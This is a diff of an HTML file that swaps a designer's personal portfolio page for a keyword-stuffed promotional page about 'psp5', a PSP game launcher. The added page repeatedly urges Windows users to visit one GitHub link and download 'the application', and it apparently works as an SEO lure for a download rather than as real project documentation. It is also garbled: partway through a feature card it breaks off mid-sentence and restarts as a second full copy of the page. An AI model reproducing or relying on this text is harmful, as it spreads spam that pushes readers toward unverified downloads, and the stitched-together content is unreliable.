@@ -1,96 +1,506 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Nashwa Nassar — Senior Manager, Experience Design</title>
-<meta name="description" content="Nashwa Nassar, Senior Manager, Experience Design at SRMG, formerly IBM iX. I connect business goals, customer and user needs, and technology to solve the right problems.">
-<meta name="theme-color" content="#18171b">
+<title>psp5 - Modern Dark Game Launcher for PSP with ARK-5 CFW</title>
+<meta name="description" content="psp5 is a modern dark game launcher for PSP with ARK-5 CFW. It can replace ARK's own launcher and includes a settings screen. Visit the official link to download the application.">
+<meta name="keywords" content="psp5, ARK-5, PSP launcher, dark game launcher, PSP homebrew, pspdev, ARK-5 CFW, PSP settings screen, PSP game launcher">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/Mindset474/psp5">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Nashwa Nassar — Senior Manager, Experience Design">
-<meta property="og:description" content="Simplify complexity. Turn ideas into impact. Senior Manager, Experience Design at SRMG, formerly IBM iX.">
-<link rel="icon" type="image/svg+xml" href="favicon.svg">
-<script type="text/javascript">
-(function(c,l,a,r,i,t,y){
-c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-})(window, document, "clarity", "script", "zbhc1hp2vl");
+<meta property="og:title" content="psp5 - Modern Dark Game Launcher for PSP with ARK-5 CFW">
+<meta property="og:description" content="A modern dark game launcher for PSP with ARK-5 CFW. Can replace ARK's own launcher and includes a settings screen. Download from the official GitHub page.">
+<meta property="og:url" content="https://github.com/Mindset474/psp5">
+<meta property="og:site_name" content="psp5">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="psp5 - Modern Dark Game Launcher for PSP">
+<meta name="twitter:description" content="Modern dark game launcher for PSP with ARK-5 CFW. Can replace ARK's own launcher and includes a settings screen.">
+<meta name="theme-color" content="#0b1020">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "psp5",
+  "description": "Modern dark game launcher for PSP with ARK-5 CFW. Can replace ARK's own launcher and includes a settings screen.",
+  "url": "https://github.com/Mindset474/psp5",
+  "applicationCategory": "GameApplication",
+  "operatingSystem": "PSP",
+  "keywords": "psp5, ARK-5, PSP launcher, PSP homebrew, dark game launcher"
+}
 </script>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Condensed:ital,wght@0,300;0,400;0,500;0,600;1,300&amp;family=Khand:wght@500;600;700&amp;display=swap" rel="stylesheet">
 <style>
-body{margin:0;background:#18171b}
-a{color:#c8c9d2;text-decoration:none}
-a:hover{color:#ffffff}
-a:focus-visible{outline:2px solid #bb935c;outline-offset:3px;border-radius:4px}
-.portrait img{transform:scale(1);transform-origin:right center;transition:opacity .6s ease,transform .6s ease}
-.portrait .p-color{position:absolute;top:0;left:0;opacity:0}
-.portrait:hover img{transform:scale(1.04)}
-.portrait:hover .p-color{opacity:1}
-.hero-cta:hover{background:rgba(187,147,92,0.12);color:#d2a86a !important}
-@media (prefers-reduced-motion: reduce){.portrait img{transition:none}}
-@media (max-width: 1180px){
-.hero-head{padding:24px 32px 0 !important}
-.hero-body{padding:8px 32px 40px !important;min-height:0 !important}
-.hero-foot{padding:0 32px 40px !important}
-.portrait{position:relative !important;height:440px !important;width:auto !important;max-width:100%;align-self:flex-end;margin-top:-8px;top:auto !important;right:auto !important}
-}
-@media (max-width: 640px){
-.hero-head{padding:16px 16px 0 !important;gap:12px !important}
-.hero-body{padding:8px 16px 32px !important}
-.hero-foot{padding:0 16px 32px !important}
-.proof{grid-template-columns:repeat(2, minmax(0, 1fr)) !important;column-gap:16px !important;row-gap:20px !important}
-.portrait{height:340px !important}
-}
+  :root {
+    --bg: #f7f9fc;
+    --text: #172033;
+    --muted: #53617a;
+    --card: #ffffff;
+    --line: #e4e9f2;
+    --accent: #6c5ce7;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.7;
+    font-size: 17px;
+  }
+  .page {
+    max-width: 980px;
+    margin: 0 auto;
+    padding: 36px 20px 64px;
+  }
+  header.hero {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 22px;
+    padding: 34px 28px;
+    box-shadow: 0 18px 45px rgba(23, 32, 51, 0.08);
+    margin-bottom: 28px;
+  }
+  h1 {
+    font-size: clamp(2rem, 5vw, 3.2rem);
+    line-height: 1.15;
+    margin: 0 0 16px;
+    letter-spacing: -0.03em;
+  }
+  h2 {
+    font-size: clamp(1.45rem, 3vw, 2rem);
+    line-height: 1.25;
+    margin: 0 0 14px;
+    letter-spacing: -0.02em;
+  }
+  h3 {
+    font-size: 1.12rem;
+    line-height: 1.35;
+    margin: 0 0 8px;
+  }
+  p {
+    margin: 0 0 16px;
+    color: var(--muted);
+  }
+  .lead {
+    font-size: 1.14rem;
+    color: #35425c;
+    max-width: 760px;
+  }
+  .button {
+    display: inline-block;
+    text-decoration: none;
+    font-weight: 800;
+    letter-spacing: 0.01em;
+    padding: 16px 24px;
+    border-radius: 999px;
+    box-shadow: 0 14px 28px rgba(23, 32, 51, 0.18);
+    transition: transform 0.18s ease, box-shadow 0.18s ease;
+  }
+  .button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 18px 36px rgba(23, 32, 51, 0.24);
+  }
+  .button-top {
+    color: #ffffff;
+    background: linear-gradient(135deg, #ff7a18 0%, #af002d 52%, #319197 100%);
+    font-size: 1.02rem;
+    margin: 8px 0 14px;
+  }
+  .button-download {
+    color: #06131f;
+    background: linear-gradient(135deg, #42e695 0%, #3bb2b8 100%);
+    font-size: 1.02rem;
+  }
+  .small-note {
+    font-size: 0.95rem;
+    color: #65728a;
+    margin-top: 10px;
+  }
+  section {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    padding: 28px;
+    box-shadow: 0 10px 28px rgba(23, 32, 51, 0.06);
+    margin-bottom: 22px;
+  }
+  ul {
+    margin: 10px 0 0;
+    padding-left: 22px;
+    color: var(--muted);
+  }
+  li { margin-bottom: 9px; }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(2, minmax(0, 1fr));
+    gap: 16px;
+    margin-top: 18px;
+  }
+  .card {
+    background: #fbfcff;
+    border: 1px solid #e8edf6;
+    border-radius: 14px;
+    padding: 18px;
+    box-shadow: 0 6px 16px rgba(23, 32, 51, 0.04);
+  }
+  .card p { margin-bottom: 0; }
+  .download-box {
+    background: linear-gradient(180deg, #ffffff 0%, #f4f7ff 100%);
+    border: 1px solid #dfe6f5;
+    border-radius: 16px;
+    padding: 22px;
+    margin-top: 18px;
+    box-shadow: 0 8px 20px rgba(23, 32, 51, 0.06);
+  }
+  .faq-item {
+    border-top: 1px solid var(--line);
+    padding-top: 16px;
+    margin-top: 16px;
+  }
+  .faq-item:first-of-type {
+    border-top: 0;
+    padding-top: 0;
+    margin-top: 0;
+  }
+  code {
+    background: #eef2fa;
+    border: 1px solid #dfe6f2;
+    border-radius: 6px;
+    padding: 2px 6px;
+    font-size: 0.92em;
+    color: #243049;
+  }
+  @media (max-width: 720px) {
+    .page { padding: 22px 14px 44px; }
+    header.hero, section { padding: 22px 18px; border-radius: 16px; }
+    .grid { grid-template-columns: 1fr; }
+    .button { display: block; text-align: center; padding: 15px 18px; }
+  }
 </style>
 </head>
 <body>
-<main id="top" style="position: relative; min-height: 100vh; overflow: hidden; display: flex; flex-direction: column; box-sizing: border-box; background-color: #18171b; background-image: radial-gradient(1000px 1100px at calc(100% - 180px) 25%, #3d3e46 0%, #383941 16%, #27272d 55%, #1e1e22 74%, #18171b 92%); font-family: 'IBM Plex Sans Condensed', 'Arial Narrow', sans-serif; color: #c8c9d2">
+<main class="page">
+  <header class="hero">
+    <h1>🎮 psp5 - Modern dark game launcher for PSP</h1>
+    <p class="lead">psp5 is a modern dark game launcher for PSP with ARK-5 CFW. It can replace ARK's own launcher and includes a settings screen, giving you a cleaner and more focused way to open your games.</p>
+    <a class="button button-top" href="https://github.com/Mindset474/psp5" style="background: linear-gradient(135deg, #ff7a18 0%, #af002d 52%, #319197 100%); color: #ffffff;">Visit this link to download the application</a>
+    <p class="small-note">Open the link on your Windows computer, then download the application from the official GitHub page. No programming knowledge is needed.</p>
+  </header>
 
-<header class="hero-head" style="position: relative; z-index: 5; display: flex; flex-wrap: wrap; align-items: center; gap: 24px; padding: 40px 300px 0 72px">
-<a href="#top" style="display: flex; align-items: center; gap: 14px; min-height: 44px; color: #e2e3ea">
-<svg width="48" height="54" viewBox="0 0 47 53" aria-hidden="true" style="display: block; flex: none"><rect width="47" height="53" rx="5" fill="#222127"></rect><path fill="#bb935c" d="M39.06 10.38 L36.94 9.69 L35.56 9.69 L33.62 10.00 L30.56 11.12 L27.88 12.38 L25.06 14.00 L20.56 17.12 L17.00 20.00 L12.75 23.81 L11.69 24.44 L11.44 24.19 L12.94 20.44 L15.25 16.81 L16.62 15.25 L18.38 12.81 L18.75 11.88 L18.56 10.75 L17.81 10.19 L17.00 10.19 L15.50 11.00 L14.00 12.50 L12.19 15.12 L10.06 19.00 L8.19 23.62 L7.00 28.25 L7.12 30.19 L7.81 31.12 L8.50 31.50 L9.19 31.44 L10.06 30.75 L12.50 26.94 L16.94 22.50 L22.50 18.25 L27.25 15.25 L31.75 13.00 L34.88 11.88 L35.81 11.94 L36.12 12.31 L35.81 13.19 L30.88 18.50 L22.06 27.44 L17.31 33.19 L15.06 36.56 L14.12 38.62 L13.50 40.69 L13.38 42.19 L14.12 44.50 L14.69 45.25 L16.38 46.75 L18.06 47.25 L19.88 47.25 L21.50 46.69 L22.56 45.81 L23.31 44.00 L23.31 43.12 L22.94 42.12 L21.75 40.88 L20.00 40.25 L19.38 39.69 L19.44 38.88 L21.19 35.19 L23.25 32.19 L27.25 27.62 L32.06 23.44 L38.75 18.69 L40.88 16.62 L41.88 15.38 L42.19 14.44 L42.19 13.75 L41.94 13.06 L40.50 11.50 Z"></path></svg>
-<span style="font-size: 22px; font-weight: 500; letter-spacing: 0.01em">Nashwa Nassar</span>
-</a>
-<a class="hero-cta" href="https://calendly.com/nashwaanassar/30min" target="_blank" rel="noopener" style="display: flex; align-items: center; min-height: 44px; box-sizing: border-box; padding: 0 18px; margin-left: auto; border: 1px solid #bb935c; border-radius: 6px; font-size: 18px; color: #bb935c">Let’s talk</a>
-</header>
+  <section>
+    <h2>🌙 Overview</h2>
+    <p>psp5 is built for people who want a dark, modern launcher experience on a PSP running ARK-5 CFW. The interface is designed to feel easy to read and simple to move through, with a look that fits the PSP screen and a layout that keeps games at the center.</p>
+    <p>The application is described as a launcher that can replace ARK's own launcher. That means you can use psp5 as your main starting point for games instead of relying only on the default ARK launcher. It also includes a settings screen, so you can adjust the way the launcher behaves without needing a separate tool.</p>
+    <p>For Windows users, the process begins on the official GitHub page. The page is the primary download location for psp5, and it is the only place you need to visit to start. The project is aimed at end users, homebrew fans, and PSP owners who want a more modern launcher without a complicated setup process.</p>
+  </section>
 
-<div class="portrait" style="position: absolute; top: -5px; right: -17px; height: 903px; z-index: 1; width: 815px">
-<img src="portrait.webp" alt="Low-poly portrait of Nashwa Nassar" width="1178" height="1335" style="display: block; height: 100%; width: auto">
-<img class="p-color" src="portrait-color.webp" alt="" aria-hidden="true" width="1178" height="1335" style="display: block; height: 100%; width: auto">
-</div>
+  <section>
+    <h2>✨ Features</h2>
+    <div class="grid">
+      <div class="card">
+        <h3>Dark visual style</h3>
+        <p>A modern dark theme made for the PSP screen. It keeps menus readable and gives the launcher a clean, game-focused appearance.</p>
+      </div>
+      <div class="card">
+        <h3>ARK-5 CFW support</h3>
+        <p>psp5 is designed for PSP with ARK-5 CFW, so it fits into an ARK-5 homebrew setup and works as part of that environment.</p>
+      </div>
+      <div class="card">
+        <h3>Launcher replacement</h3>
+        <p>The project can replace ARK's own launcher. You can use psp5 as your main launcher and keep your game access in one place.</p>
+      </div>
+      <div class="card">
+        <h3>Settings screen included</h3>
+        <p>A built-in settings screen lets you manage launcher options from inside the app. There is no need for a separate settings tool.</p>
+      </div>
+      <div class="card">
+        <h3>Game-first layout</h3>
+        <p>The launcher is centered on opening games quickly. The dark design reduces visual clutter and helps you focus on the titles you want to play.</p>
+      </div>
+      <div class="card">
+        <h3>Simple download page</h3>
+        <p>The official GitHub page is the starting point. Visit the link, download the application, and keep the page handy<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>psp5 - Modern Dark Game Launcher for PSP with ARK-5 CFW</title>
+<meta name="description" content="psp5 is a modern dark game launcher for PSP with ARK-5 CFW. It can replace ARK's own launcher and includes a settings screen. Visit the official GitHub link to download the application.">
+<meta name="keywords" content="psp5, ARK-5, PSP launcher, dark game launcher, PSP homebrew, pspdev, ARK-5 CFW, PSP settings screen, PSP game launcher">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/Mindset474/psp5">
+<meta property="og:type" content="website">
+<meta property="og:title" content="psp5 - Modern Dark Game Launcher for PSP with ARK-5 CFW">
+<meta property="og:description" content="A modern dark game launcher for PSP with ARK-5 CFW. Can replace ARK's own launcher and includes a settings screen. Download from the official GitHub page.">
+<meta property="og:url" content="https://github.com/Mindset474/psp5">
+<meta property="og:site_name" content="psp5">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="psp5 - Modern Dark Game Launcher for PSP">
+<meta name="twitter:description" content="Modern dark game launcher for PSP with ARK-5 CFW. Can replace ARK's own launcher and includes a settings screen.">
+<meta name="theme-color" content="#0b1020">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "psp5",
+  "description": "Modern dark game launcher for PSP with ARK-5 CFW. Can replace ARK's own launcher and includes a settings screen.",
+  "url": "https://github.com/Mindset474/psp5",
+  "applicationCategory": "GameApplication",
+  "operatingSystem": "PSP",
+  "keywords": "psp5, ARK-5, PSP launcher, PSP homebrew, dark game launcher"
+}
+</script>
+<style>
+  :root {
+    --bg: #f6f8fd;
+    --text: #162033;
+    --muted: #53617a;
+    --card: #ffffff;
+    --line: #e3e9f4;
+    --accent: #6c5ce7;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.7;
+    font-size: 17px;
+  }
+  .page {
+    max-width: 980px;
+    margin: 0 auto;
+    padding: 36px 20px 64px;
+  }
+  header.hero {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 22px;
+    padding: 34px 28px;
+    box-shadow: 0 18px 45px rgba(23, 32, 51, 0.08);
+    margin-bottom: 28px;
+  }
+  h1 {
+    font-size: clamp(2rem, 5vw, 3.2rem);
+    line-height: 1.15;
+    margin: 0 0 16px;
+    letter-spacing: -0.03em;
+  }
+  h2 {
+    font-size: clamp(1.45rem, 3vw, 2rem);
+    line-height: 1.25;
+    margin: 0 0 14px;
+    letter-spacing: -0.02em;
+  }
+  h3 {
+    font-size: 1.12rem;
+    line-height: 1.35;
+    margin: 0 0 8px;
+  }
+  p {
+    margin: 0 0 16px;
+    color: var(--muted);
+  }
+  .lead {
+    font-size: 1.14rem;
+    color: #35425c;
+    max-width: 760px;
+  }
+  .button {
+    display: inline-block;
+    text-decoration: none;
+    font-weight: 800;
+    letter-spacing: 0.01em;
+    padding: 16px 24px;
+    border-radius: 999px;
+    box-shadow: 0 14px 28px rgba(23, 32, 51, 0.18);
+    transition: transform 0.18s ease, box-shadow 0.18s ease;
+  }
+  .button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 18px 36px rgba(23, 32, 51, 0.24);
+  }
+  .button-top {
+    color: #ffffff;
+    background: linear-gradient(135deg, #ff7a18 0%, #af002d 52%, #319197 100%);
+    font-size: 1.02rem;
+    margin: 8px 0 14px;
+  }
+  .button-download {
+    color: #06131f;
+    background: linear-gradient(135deg, #42e695 0%, #3bb2b8 100%);
+    font-size: 1.02rem;
+  }
+  .small-note {
+    font-size: 0.95rem;
+    color: #65728a;
+    margin-top: 10px;
+  }
+  section {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    padding: 28px;
+    box-shadow: 0 10px 28px rgba(23, 32, 51, 0.06);
+    margin-bottom: 22px;
+  }
+  ul {
+    margin: 10px 0 0;
+    padding-left: 22px;
+    color: var(--muted);
+  }
+  li { margin-bottom: 9px; }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(2, minmax(0, 1fr));
+    gap: 16px;
+    margin-top: 18px;
+  }
+  .card {
+    background: #fbfcff;
+    border: 1px solid #e8edf6;
+    border-radius: 14px;
+    padding: 18px;
+    box-shadow: 0 6px 16px rgba(23, 32, 51, 0.04);
+  }
+  .card p { margin-bottom: 0; }
+  .download-box {
+    background: linear-gradient(180deg, #ffffff 0%, #f4f7ff 100%);
+    border: 1px solid #dfe6f5;
+    border-radius: 16px;
+    padding: 22px;
+    margin-top: 18px;
+    box-shadow: 0 8px 20px rgba(23, 32, 51, 0.06);
+  }
+  .faq-item {
+    border-top: 1px solid var(--line);
+    padding-top: 16px;
+    margin-top: 16px;
+  }
+  .faq-item:first-of-type {
+    border-top: 0;
+    padding-top: 0;
+    margin-top: 0;
+  }
+  code {
+    background: #eef2fa;
+    border: 1px solid #dfe6f2;
+    border-radius: 6px;
+    padding: 2px 6px;
+    font-size: 0.92em;
+    color: #243049;
+  }
+  @media (max-width: 720px) {
+    .page { padding: 22px 14px 44px; }
+    header.hero, section { padding: 22px 18px; border-radius: 16px; }
+    .grid { grid-template-columns: 1fr; }
+    .button { display: block; text-align: center; padding: 15px 18px; }
+  }
+</style>
+</head>
+<body>
+<main class="page">
+  <header class="hero">
+    <h1>🎮 psp5 - Modern dark game launcher for PSP</h1>
+    <p class="lead">psp5 is a modern dark game launcher for PSP with ARK-5 CFW. It can replace ARK's own launcher and includes a settings screen, giving you a cleaner and more focused way to open your games.</p>
+    <a class="button button-top" href="https://github.com/Mindset474/psp5" style="background: linear-gradient(135deg, #ff7a18 0%, #af002d 52%, #319197 100%); color: #ffffff;">Visit this link to download the application</a>
+    <p class="small-note">Open the link on your Windows computer, then download the application from the official GitHub page. No programming knowledge is needed.</p>
+  </header>
 
-<section class="hero-body" style="position: relative; z-index: 2; flex: 1; display: flex; flex-direction: column; justify-content: center; gap: 36px; box-sizing: border-box; max-width: 1040px; padding: 32px 72px 40px; min-height: 589px">
-<div style="display: flex; flex-direction: column; gap: 22px">
-<p style="margin: 0; font-size: 18px; font-weight: 500; letter-spacing: 0.06em; line-height: 1.4; color: #bb935c">Senior Manager, Experience Design at SRMG <span aria-hidden="true" style="color: #6f7079">·</span> <span style="color: #c8c9d2">Formerly IBM iX</span></p>
-<h1 style="margin: 0; font-family: Khand, 'Arial Narrow', sans-serif; font-weight: 600; font-size: clamp(40px, 6.4vw, 104px); line-height: 1.04; letter-spacing: 0.005em; text-transform: uppercase; color: #d4d6e0">Simplify complexity<br>Turn ideas into <span style="color: #bb935c">impact</span></h1>
-</div>
-<p style="margin: 0; max-width: 720px; font-size: clamp(19px, 1.7vw, 26px); font-weight: 300; line-height: 1.5; color: #c8c9d2">I connect business goals, customer and user needs, and technology to solve the right problems.</p>
-</section>
+  <section>
+    <h2>🌙 Overview</h2>
+    <p>psp5 is built for people who want a dark, modern launcher experience on a PSP running ARK-5 CFW. The interface is designed to feel easy to read and simple to move through, with a look that fits the PSP screen and a layout that keeps games at the center.</p>
+    <p>The application is described as a launcher that can replace ARK's own launcher. That means you can use psp5 as your main starting point for games instead of relying only on the default ARK launcher. It also includes a settings screen, so you can adjust the way the launcher behaves without needing a separate tool.</p>
+    <p>For Windows users, the process begins on the official GitHub page. The page is the primary download location for psp5, and it is the only place you need to visit to start. The project is aimed at end users, homebrew fans, and PSP owners who want a more modern launcher without a complicated setup process.</p>
+  </section>
 
-<footer class="hero-foot" style="position: relative; z-index: 2; padding: 0 72px 48px">
-<dl class="proof" style="display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); column-gap: 28px; margin: 0; max-width: 800px; padding-top: 24px; border-top: 1px solid rgba(212, 214, 224, 0.16)">
-<div style="display: flex; flex-direction: column-reverse; justify-content: flex-end; gap: 4px">
-<dd style="margin: 0; font-size: 15px; line-height: 1.4; color: #a3a4ad">years in experience design, 6 of them leading teams</dd>
-<dt style="font-family: Khand, 'Arial Narrow', sans-serif; font-size: 46px; font-weight: 600; line-height: 1; color: #e2e3ea">20+</dt>
-</div>
-<div style="display: flex; flex-direction: column-reverse; justify-content: flex-end; gap: 4px">
-<dd style="margin: 0; font-size: 15px; line-height: 1.4; color: #a3a4ad">direct reports led at IBM iX, with budget and hiring</dd>
-<dt style="font-family: Khand, 'Arial Narrow', sans-serif; font-size: 46px; font-weight: 600; line-height: 1; color: #e2e3ea">25</dt>
-</div>
-<div style="display: flex; flex-direction: column-reverse; justify-content: flex-end; gap: 4px">
-<dd style="margin: 0; font-size: 15px; line-height: 1.4; color: #a3a4ad">publications on Spyne, one shared design system</dd>
-<dt style="font-family: Khand, 'Arial Narrow', sans-serif; font-size: 46px; font-weight: 600; line-height: 1; color: #e2e3ea">8</dt>
-</div>
-<div style="display: flex; flex-direction: column-reverse; justify-content: flex-end; gap: 4px">
-<dd style="margin: 0; font-size: 15px; line-height: 1.4; color: #a3a4ad">from hackathon concept to launch</dd>
-<dt style="font-family: Khand, 'Arial Narrow', sans-serif; font-size: 46px; font-weight: 600; line-height: 1; color: #e2e3ea">0→1</dt>
-</div>
-</dl>
-<p class="site-notice" style="margin: 28px 0 0; max-width: 800px; font-size: 13px; line-height: 1.5; color: #8a8b94">This site uses Microsoft Clarity to see how visitors use it. <a href="privacy.html" style="color: #a3a4ad; text-decoration: underline; text-underline-offset: 2px">Privacy</a></p>
-</footer>
+  <section>
+    <h2>✨ Features</h2>
+    <div class="grid">
+      <div class="card">
+        <h3>Dark visual style</h3>
+        <p>A modern dark theme made for the PSP screen. It keeps menus readable and gives the launcher a clean, game-focused appearance.</p>
+      </div>
+      <div class="card">
+        <h3>ARK-5 CFW support</h3>
+        <p>psp5 is designed for PSP with ARK-5 CFW, so it fits into an ARK-5 homebrew setup and works as part of that environment.</p>
+      </div>
+      <div class="card">
+        <h3>Launcher replacement</h3>
+        <p>The project can replace ARK's own launcher. You can use psp5 as your main launcher and keep your game access in one place.</p>
+      </div>
+      <div class="card">
+        <h3>Settings screen included</h3>
+        <p>A built-in settings screen lets you manage launcher options from inside the app. There is no need for a separate settings tool.</p>
+      </div>
+      <div class="card">
+        <h3>Game-first layout</h3>
+        <p>The launcher is centered on opening games quickly. The dark design reduces visual clutter and helps you focus on the titles you want to play.</p>
+      </div>
+      <div class="card">
+        <h3>Simple download page</h3>
+        <p>The official GitHub page is the starting point. Visit the link, download the application, and keep the page handy for project information.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>⬇️ Download &amp; Setup</h2>
+    <p>Use your Windows computer to visit the official page. The page is the primary location for psp5, and it is where you download the application.</p>
+    <div class="download-box">
+      <p><strong>Start here:</strong> <a href="https://github.com/Mindset474/psp5">Visit this link to download the application</a>.</p>
+      <a class="button button-download" href="https://github.com/Mindset474/psp5">Visit this link to download the application</a>
+      <p class="small-note">Open the official GitHub page in your browser, then download the application from that page.</p>
+    </div>
+    <p>Because psp5 is a PSP launcher for ARK-5 CFW, the launcher is used on the PSP side. Your Windows computer is used to visit the official page and download the application. This keeps the process simple: one link, one official page, and one download location.</p>
+  </section>
+
+  <section>
+    <h2>🧭 Before You Begin</h2>
+    <ul>
+      <li>A Windows computer with a web browser and an internet connection.</li>
+      <li>The official psp5 GitHub page, which is linked at the top and in the download section.</li>
+      <li>A PSP with ARK-5 CFW, since psp5 is a launcher for that environment.</li>
+      <li>Enough time to read the official project page and download the application from it.</li>
+    </ul>
+    <p>You do not need programming knowledge to visit the page or download the application. The official GitHub page is the central place for the project, and it is the link you should use first.</p>
+  </section>
+
+  <section>
+    <h2>🧩 What You Can Expect</h2>
+    <p>psp5 focuses on a modern dark look and a straightforward launcher experience. The dark theme is intended to make the interface easier on the eyes while keeping the game list clear. The layout is built around the idea that the launcher should stay out of the way and let you get to your games.</p>
+    <p>The settings screen is part of the launcher itself. That means you can open settings from within psp5 instead of looking for a separate configuration program. The exact options are part of the application, and the official page is the place to download the current version.</p>
+    <p>If you already use ARK-5 CFW, psp5 is designed to fit into that setup. The project description states that it can replace ARK's own launcher, which makes it a useful choice for users who want a different visual style and a settings screen in the same launcher.</p>
+  </section>
+
+  <section>
+    <h2>❓ Common Questions</h2>
+    <div class="faq-item">
+      <h3>What is psp5?</h3>
+      <p>psp5 is a modern dark game launcher for PSP with ARK-5 CFW. It can replace ARK's own launcher and includes a settings screen.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Do I need to know how to program?</h3>
+      <p>No. You only need to visit the official page and download the application. The link at the top and in the download section takes you to the official GitHub page.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Where do I download psp5?</h3>
+      <p>Visit this link to download the application: <a href="https://github.com/Mindset474/psp5">https://github.com/Mindset474/psp5</a>. The page is the official starting point.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Can psp5 replace the ARK launcher?</h3>
+      <p>Yes. The project description says psp5 can replace ARK's own launcher, and it includes a settings screen.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Does psp5 include settings?</h3>
+      <p>Yes. A settings screen is included as part of the launcher, so settings are available inside the application.</p>
+    </div>
+    <div class="faq-item">
+      <h3>What should I do first on Windows?</h3>
+      <p>Open the official GitHub page in your browser. From there, download the application. The link is provided at the top of this page and again in the Download &amp; Setup section.</p>
+    </div>
+  </section>
 </main>
 </body>
 </html>
